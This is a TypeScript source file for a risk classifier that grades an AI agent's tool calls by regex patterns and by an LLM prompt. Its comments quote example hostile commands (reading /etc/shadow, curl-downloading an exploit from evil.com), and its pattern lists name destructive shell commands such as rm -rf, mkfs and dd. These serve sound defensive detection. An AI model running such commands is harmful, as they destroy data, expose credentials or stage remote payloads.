/**
 * Risk classifier.
 *
 * Two-layer system:
 *   1. Structural classification — fast, based on tool type (what KIND of tool is it?)
 *   2. AI classification — smart, understands WHAT the action actually does
 *
 * The structural layer gets a baseline. The AI layer can ESCALATE (never downgrade).
 * If AI is unavailable, falls back to structural only.
 */

import { RiskTier } from '@wooblay/types';

// ── Business-context categories ─────────────────────────────────────────────

export type BusinessCategory =
  | 'code'           // creating/editing source files
  | 'git'            // commits, pushes, PRs, branch ops
  | 'packages'       // npm install, pip install, deps
  | 'shell'          // general command execution
  | 'files'          // file system ops (mkdir, cp, mv, read non-code)
  | 'network'        // HTTP requests, API calls, web fetching
  | 'secrets'        // accessing .env, credentials, API keys
  | 'infra'          // deployment, server config, Docker, CI/CD
  | 'communication'  // sending messages, emails, webhooks
  | 'destructive'    // rm -rf, drop, format, irreversible
  | 'data'           // database queries, data manipulation
  | 'other';         // unknown/unclassified

// ── AI Risk Classification ───────────────────────────────────────────────────

export interface AIRiskResult {
  riskTier: RiskTier;
  category: BusinessCategory;
  reasoning: string;
  description: string;      // human-readable "what this does"
  whyReview: string | null;  // human-readable "why this needs review" (null = no concern)
}

/**
 * AI-powered risk and category classification.
 * Returns null if AI is unavailable — caller should fall back to structural.
 *
 * This is the "smart" layer. It understands intent:
 *   - `cat /etc/shadow` → secrets, WRITE (it knows shadow has password hashes)
 *   - `curl http://evil.com/exploit.sh -o /tmp/x` → network, DESTRUCTIVE (download + stage)
 *   - `ls -la` → files, READ (obviously harmless)
 *
 * The AI is fast because we use low max_tokens and temperature 0.
 */
export async function classifyWithAI(
  toolName: string,
  args: Record<string, unknown>,
  structuralRisk: RiskTier,
  structuralCategory: BusinessCategory,
): Promise<AIRiskResult | null> {
  // Dynamic import to avoid circular deps and keep this module loadable without OpenAI
  const { config } = await import('../config.js');
  if (!config.OPENAI_API_KEY) return null;

  const { default: OpenAI } = await import('openai');
  const client = new OpenAI({ apiKey: config.OPENAI_API_KEY });

  const argsStr = JSON.stringify(args).slice(0, 800);
  const normalized = toolName.replace(/^(wooblay_|gated_)/, '');

  try {
    const response = await client.chat.completions.create({
      model: config.OPENAI_MODEL ?? 'gpt-4o-mini',
      temperature: 0,
      max_tokens: 200,
      messages: [
        {
          role: 'system',
          content: `You are the AI security layer for an agent supervision platform. An AI agent is trying to execute a tool call. You must:

1. CLASSIFY the risk:
   - riskTier: "READ" (no side effects), "WRITE" (modifies state, accesses sensitive data, downloads), or "DESTRUCTIVE" (irreversible damage)
   - category: one of: code, git, packages, shell, files, network, secrets, infra, communication, destructive, data, other

2. DESCRIBE what this action does in plain English for a non-technical human. Be specific about WHAT it affects and WHY someone should care. Don't be generic — translate the technical action into its real-world impact.
   Examples: "Reads the system password file containing encrypted passwords for all users" not "Reads a file"
   "Installs 3 npm packages including a database driver" not "Runs a command"

3. If this needs human review, explain WHY in one sentence a manager would understand. If it's safe/routine, set whyReview to null.

Key classification rules:
- Reading sensitive files (passwords, keys, credentials, system config) = WRITE + secrets
- Downloading from the internet = at least WRITE + network  
- Download + execute (pipe to shell) = DESTRUCTIVE
- sudo, mass deletion, disk formatting = DESTRUCTIVE
- Normal dev work (editing code, tests, git commit) = appropriate lower tier

Respond JSON ONLY:
{"riskTier":"...","category":"...","description":"...","reasoning":"...","whyReview":"...or null"}`,
        },
        {
          role: 'user',
          content: `Tool: ${normalized}\nArgs: ${argsStr}`,
        },
      ],
    });

    const text = response.choices[0]?.message?.content ?? '';
    const jsonMatch = text.match(/\{[\s\S]*?\}/);
    if (!jsonMatch) return null;

    const result = JSON.parse(jsonMatch[0]);

    // Validate and normalize
    const validTiers = ['READ', 'WRITE', 'DESTRUCTIVE'];
    const aiTier = validTiers.includes(result.riskTier) ? result.riskTier as RiskTier : structuralRisk;
    const aiCategory = result.category as BusinessCategory || structuralCategory;

    // AI can only ESCALATE risk, never downgrade (safety principle)
    const tierOrder = { READ: 0, WRITE: 1, DESTRUCTIVE: 2 };
    const finalTier = tierOrder[aiTier] >= tierOrder[structuralRisk] ? aiTier : structuralRisk;

    return {
      riskTier: finalTier,
      category: aiCategory,
      reasoning: result.reasoning ?? '',
      description: result.description ?? '',
      whyReview: result.whyReview ?? null,
    };
  } catch (err) {
    console.warn('[risk] AI classification failed, using structural fallback:', err);
    return null;
  }
}

// ── Structural Classification (fast fallback) ────────────────────────────────

const CODE_EXTENSIONS = /\.(ts|tsx|js|jsx|py|rb|go|rs|java|c|cpp|h|css|scss|html|vue|svelte|json|yaml|yml|toml|md|sql)$/i;

/** Patterns for obviously destructive commands (minimal — AI handles the rest). */
const DESTRUCTIVE_PATTERNS = [
  /\brm\s+(-\w*)?-r/,
  /\brm\s+(-\w*)?-f/,
  /\bsudo\b/,
  /\bmkfs\b/,
  /\bdd\b\s+/,
  /\bshutdown\b/,
  /\breboot\b/,
  /\bchmod\s+777\b/,
  />\s*\/dev\//,
];

/** Patterns for write-level commands. */
const WRITE_PATTERNS = [
  /\bmv\b/,
  /\bcp\b/,
  /\bmkdir\b/,
  /\bchmod\b/,
  /\bchown\b/,
  /\btee\b/,
  /\bsed\b.*-i/,
  /\bgit\s+(push|commit|merge|rebase)\b/,
  /\bnpm\s+(publish|install)\b/,
  /\bpip\s+install\b/,
  />>?\s/,
];

/**
 * Structural risk classification — fast, deterministic, based on tool type.
 * This is the baseline. AI enrichment can escalate it.
 */
export function classifyRisk(
  toolName: string,
  args: Record<string, unknown>,
): RiskTier {
  const normalized = toolName.replace(/^wooblay_/, '');

  switch (normalized) {
    case 'exec':
    case 'process': {
      const command = String(args['command'] ?? args['cmd'] ?? '');
      for (const pattern of DESTRUCTIVE_PATTERNS) {
        if (pattern.test(command)) return RiskTier.DESTRUCTIVE;
      }
      for (const pattern of WRITE_PATTERNS) {
        if (pattern.test(command)) return RiskTier.WRITE;
      }
      // Shell commands that aren't obviously write/destructive default to READ
      // but the AI layer will catch things like `cat /etc/shadow`
      return RiskTier.READ;
    }

    case 'http':
    case 'web_fetch':
    case 'web_search': {
      const method = String(args['method'] ?? 'GET').toUpperCase();
      if (method === 'GET' || method === 'HEAD' || method === 'OPTIONS') return RiskTier.READ;
      if (method === 'DELETE') return RiskTier.DESTRUCTIVE;
      return RiskTier.WRITE;
    }

    case 'browser':
      return RiskTier.WRITE;

    case 'read':
      return RiskTier.READ;

    case 'write':
    case 'edit':
    case 'apply_patch':
      return RiskTier.WRITE;

    case 'sessions_spawn':
    case 'sessions_send':
    case 'message':
      return RiskTier.WRITE;

    case 'cron':
    case 'gateway':
      return RiskTier.WRITE;

    default:
      return RiskTier.WRITE;
  }
}

/**
 * Structural category classification — fast, regex-based fallback.
 * Used when AI is unavailable.
 */
export function classifyCategory(
  toolName: string,
  args: Record<string, unknown>,
): BusinessCategory {
  const normalized = toolName.replace(/^(wooblay_|gated_)/, '');
  const command = String(args['command'] ?? args['cmd'] ?? '');
  const path = String(args['path'] ?? args['file'] ?? args['filepath'] ?? '');

  // Destructive
  if (normalized === 'exec' || normalized === 'process') {
    for (const p of DESTRUCTIVE_PATTERNS) {
      if (p.test(command)) return 'destructive';
    }
  }

  // Git
  if (/\bgit\s+(push|commit|merge|rebase|pull|clone|checkout|branch)\b/.test(command)) return 'git';

  // Packages
  if (/\b(npm|yarn|pnpm|pip|cargo|gem|composer|brew)\s+(install|add|remove|update|publish)\b/.test(command)) return 'packages';

  // Network
  if (['http', 'web_fetch', 'web_search'].includes(normalized)) return 'network';
  if (/\b(curl|wget)\b/.test(command)) return 'network';

  // Communication
  if (['sessions_spawn', 'sessions_send', 'message'].includes(normalized)) return 'communication';

  // File ops — code vs generic
  if (['write', 'edit', 'apply_patch', 'read'].includes(normalized)) {
    return CODE_EXTENSIONS.test(path) ? 'code' : 'files';
  }

  // Shell fallback
  if (normalized === 'exec' || normalized === 'process') return 'shell';

  if (normalized === 'browser') return 'network';

  return 'other';
}
